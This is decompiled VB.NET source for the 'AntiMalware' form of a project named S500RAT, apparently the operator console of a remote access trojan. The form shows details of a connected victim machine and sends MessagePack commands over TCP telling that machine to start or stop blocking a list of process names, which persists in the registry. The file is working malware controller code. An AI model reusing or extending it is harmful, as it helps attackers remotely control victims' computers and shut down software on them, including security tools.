Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000010 RID: 16
	<DesignerGenerated()>
	Public Partial Class FormAntiMalware
		Inherits Form

		' Token: 0x060000AD RID: 173 RVA: 0x00006006 File Offset: 0x00004206
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormAntiMalware_Load
			AddHandler MyBase.Resize, AddressOf Me.FormAntiMalware_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x1700005D RID: 93
		' (get) Token: 0x060000B0 RID: 176 RVA: 0x00007326 File Offset: 0x00005526
		' (set) Token: 0x060000B1 RID: 177 RVA: 0x00007330 File Offset: 0x00005530
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700005E RID: 94
		' (get) Token: 0x060000B2 RID: 178 RVA: 0x00007373 File Offset: 0x00005573
		' (set) Token: 0x060000B3 RID: 179 RVA: 0x0000737D File Offset: 0x0000557D
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x1700005F RID: 95
		' (get) Token: 0x060000B4 RID: 180 RVA: 0x00007386 File Offset: 0x00005586
		' (set) Token: 0x060000B5 RID: 181 RVA: 0x00007390 File Offset: 0x00005590
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000060 RID: 96
		' (get) Token: 0x060000B6 RID: 182 RVA: 0x00007399 File Offset: 0x00005599
		' (set) Token: 0x060000B7 RID: 183 RVA: 0x000073A3 File Offset: 0x000055A3
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000061 RID: 97
		' (get) Token: 0x060000B8 RID: 184 RVA: 0x000073AC File Offset: 0x000055AC
		' (set) Token: 0x060000B9 RID: 185 RVA: 0x000073B8 File Offset: 0x000055B8
		Friend Overridable Property TextBox1 As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1_IconLeftClick
				Dim value3 As EventHandler = AddressOf Me.TextBox1_IconRightClick
				Dim value4 As EventHandler = AddressOf Me.TextBox1_TextChanged
				Dim textBox As Guna2TextBox = Me._TextBox1
				If textBox IsNot Nothing Then
					RemoveHandler textBox.IconLeftClick, value2
					RemoveHandler textBox.IconRightClick, value3
					RemoveHandler textBox.TextChanged, value4
				End If
				Me._TextBox1 = value
				textBox = Me._TextBox1
				If textBox IsNot Nothing Then
					AddHandler textBox.IconLeftClick, value2
					AddHandler textBox.IconRightClick, value3
					AddHandler textBox.TextChanged, value4
				End If
			End Set
		End Property

		' Token: 0x17000062 RID: 98
		' (get) Token: 0x060000BA RID: 186 RVA: 0x00007431 File Offset: 0x00005631
		' (set) Token: 0x060000BB RID: 187 RVA: 0x0000743B File Offset: 0x0000563B
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x17000063 RID: 99
		' (get) Token: 0x060000BC RID: 188 RVA: 0x00007444 File Offset: 0x00005644
		' (set) Token: 0x060000BD RID: 189 RVA: 0x0000744E File Offset: 0x0000564E
		Public Overridable Property State As Label

		' Token: 0x17000064 RID: 100
		' (get) Token: 0x060000BE RID: 190 RVA: 0x00007457 File Offset: 0x00005657
		' (set) Token: 0x060000BF RID: 191 RVA: 0x00007464 File Offset: 0x00005664
		Friend Overridable Property Block As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Block
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Block_Click_1
				Dim block As Guna2GradientButton = Me._Block
				If block IsNot Nothing Then
					RemoveHandler block.Click, value2
				End If
				Me._Block = value
				block = Me._Block
				If block IsNot Nothing Then
					AddHandler block.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000065 RID: 101
		' (get) Token: 0x060000C0 RID: 192 RVA: 0x000074A7 File Offset: 0x000056A7
		' (set) Token: 0x060000C1 RID: 193 RVA: 0x000074B1 File Offset: 0x000056B1
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000066 RID: 102
		' (get) Token: 0x060000C2 RID: 194 RVA: 0x000074BA File Offset: 0x000056BA
		' (set) Token: 0x060000C3 RID: 195 RVA: 0x000074C4 File Offset: 0x000056C4
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000067 RID: 103
		' (get) Token: 0x060000C4 RID: 196 RVA: 0x000074CD File Offset: 0x000056CD
		' (set) Token: 0x060000C5 RID: 197 RVA: 0x000074D7 File Offset: 0x000056D7
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000068 RID: 104
		' (get) Token: 0x060000C6 RID: 198 RVA: 0x000074E0 File Offset: 0x000056E0
		' (set) Token: 0x060000C7 RID: 199 RVA: 0x000074EA File Offset: 0x000056EA
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000069 RID: 105
		' (get) Token: 0x060000C8 RID: 200 RVA: 0x000074F3 File Offset: 0x000056F3
		' (set) Token: 0x060000C9 RID: 201 RVA: 0x00007500 File Offset: 0x00005700
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700006A RID: 106
		' (get) Token: 0x060000CA RID: 202 RVA: 0x00007543 File Offset: 0x00005743
		' (set) Token: 0x060000CB RID: 203 RVA: 0x0000754D File Offset: 0x0000574D
		Friend Overridable Property ListAni As Guna2DataGridView

		' Token: 0x1700006B RID: 107
		' (get) Token: 0x060000CC RID: 204 RVA: 0x00007556 File Offset: 0x00005756
		' (set) Token: 0x060000CD RID: 205 RVA: 0x00007560 File Offset: 0x00005760
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x1700006C RID: 108
		' (get) Token: 0x060000CE RID: 206 RVA: 0x00007569 File Offset: 0x00005769
		' (set) Token: 0x060000CF RID: 207 RVA: 0x00007573 File Offset: 0x00005773
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x1700006D RID: 109
		' (get) Token: 0x060000D0 RID: 208 RVA: 0x0000757C File Offset: 0x0000577C
		' (set) Token: 0x060000D1 RID: 209 RVA: 0x00007586 File Offset: 0x00005786
		Friend Overridable Property ElipseList As Guna2Elipse

		' Token: 0x1700006E RID: 110
		' (get) Token: 0x060000D2 RID: 210 RVA: 0x0000758F File Offset: 0x0000578F
		' (set) Token: 0x060000D3 RID: 211 RVA: 0x00007599 File Offset: 0x00005799
		Public Property Client As Clients

		' Token: 0x1700006F RID: 111
		' (get) Token: 0x060000D4 RID: 212 RVA: 0x000075A2 File Offset: 0x000057A2
		' (set) Token: 0x060000D5 RID: 213 RVA: 0x000075AC File Offset: 0x000057AC
		Public Property F As FormS500

		' Token: 0x17000070 RID: 112
		' (get) Token: 0x060000D6 RID: 214 RVA: 0x000075B5 File Offset: 0x000057B5
		' (set) Token: 0x060000D7 RID: 215 RVA: 0x000075BF File Offset: 0x000057BF
		Public Property FullPath As String

		' Token: 0x17000071 RID: 113
		' (get) Token: 0x060000D8 RID: 216 RVA: 0x000075C8 File Offset: 0x000057C8
		' (set) Token: 0x060000D9 RID: 217 RVA: 0x000075D2 File Offset: 0x000057D2
		Friend Property ParentClient As Clients

		' Token: 0x060000DA RID: 218 RVA: 0x000075DC File Offset: 0x000057DC
		Private Sub FormAntiMalware_Load(sender As Object, e As EventArgs)
			Me.ListAni.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListAni.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListAni.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListAni.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListAni.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListAni.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListAni.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListAni.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListAni.CellBorderStyle = DataGridViewCellBorderStyle.[Single]
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.ReadListAntiMalware()
		End Sub

		' Token: 0x060000DB RID: 219 RVA: 0x000077D8 File Offset: 0x000059D8
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060000DC RID: 220 RVA: 0x00007844 File Offset: 0x00005A44
		Private Sub FormAntiMalware_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060000DD RID: 221 RVA: 0x000078D8 File Offset: 0x00005AD8
		Private Sub ReadListAntiMalware()
			Try
				Dim text As String = Conversions.ToString(Functions.RegistryGetValue("#ListAntiMalware", ""))
				Dim flag As Boolean = text <> Nothing
				If flag Then
					Dim array As String() = text.Split(New String() { "*" }, StringSplitOptions.None)
					For Each text2 As String In array
						Dim flag2 As Boolean = text2.Length > 0
						If flag2 Then
							Me.ListAni.Rows.Add(New Object() { Me.ImageList1.Images("B.png"), text2 })
						End If
					Next
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000DE RID: 222 RVA: 0x000079A4 File Offset: 0x00005BA4
		Public Sub SaveListAntiMalware()
			Try
				Dim text As String = String.Empty
				Try
					For Each obj As Object In CType(Me.ListAni.Rows, IEnumerable)
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim flag As Boolean = Not dataGridViewRow.IsNewRow
						If flag Then
							text = text + dataGridViewRow.Cells(1).Value.ToString() + "*"
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Functions.RegistrySetValue("#ListAntiMalware", Conversions.ToString(text))
			Catch ex As Exception
				Console.WriteLine(ex.Message)
			End Try
		End Sub

		' Token: 0x060000DF RID: 223 RVA: 0x00007A7C File Offset: 0x00005C7C
		Private Sub TextBox1_IconLeftClick(sender As Object, e As EventArgs)
			Try
				Try
					For Each obj As Object In Me.ListAni.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Me.ListAni.Rows.Remove(dataGridViewRow)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			Catch ex As Exception
				MessageBox.Show(ex.Message, "AntiMalware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x060000E0 RID: 224 RVA: 0x00007B24 File Offset: 0x00005D24
		Private Sub TextBox1_IconRightClick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, Nothing, False) = 0
				If flag Then
					MessageBox.Show("Please enter Process Name", "AntiMalware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Me.ListAni.Rows.Add(New Object() { Me.ImageList1.Images("B.png"), Me.TextBox1.Text })
					Me.TextBox1.Clear()
				End If
			Catch ex As Exception
				MessageBox.Show(ex.Message, "AntiMalware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x060000E1 RID: 225 RVA: 0x00007BE4 File Offset: 0x00005DE4
		Private Sub Block_Click_1(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				Dim flag As Boolean = Operators.CompareString(Me.Block.Text, "Stop", False) = 0
				If flag Then
					msgPack.ForcePathObject("Packet").AsString = "Stop"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.Block.Enabled = False
				Else
					Dim flag2 As Boolean = Me.ListAni.Rows.Count = 0
					If flag2 Then
						MessageBox.Show("Please add the names of the processes you want to block in the list", "AntiMalware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					Else
						Dim text As String = String.Empty
						Try
							For Each obj As Object In CType(Me.ListAni.Rows, IEnumerable)
								Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
								Dim flag3 As Boolean = Not dataGridViewRow.IsNewRow
								If flag3 Then
									text = text + dataGridViewRow.Cells(1).Value.ToString() + ","
								End If
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
						msgPack.ForcePathObject("Packet").AsString = "Start"
						msgPack.ForcePathObject("ListProcess").AsString = text
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Me.Block.Enabled = False
						Me.TextBox1.Enabled = False
						Me.SaveListAntiMalware()
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000E2 RID: 226 RVA: 0x00007DBC File Offset: 0x00005FBC
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Block.Text, "Stop", False) = 0
			If flag Then
				Dim dialogResult As DialogResult = MessageBox.Show("If you want to keep blocking software's running, click Yes or No to end the sessio", "Antimalware!", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
				Dim flag2 As Boolean = dialogResult = DialogResult.No
				If flag2 Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "Stop"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Debug.WriteLine("Sent.///")
					Dim client As Clients = Me.Client
					If client IsNot Nothing Then
						client.Disconnected()
					End If
					MyBase.Close()
				End If
			Else
				Dim client2 As Clients = Me.Client
				If client2 IsNot Nothing Then
					client2.Disconnected()
				End If
				MyBase.Close()
			End If
		End Sub

		' Token: 0x060000E3 RID: 227 RVA: 0x00007E7F File Offset: 0x0000607F
		Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x04000065 RID: 101
		Private FormSize As Boolean
	End Class
End Namespace
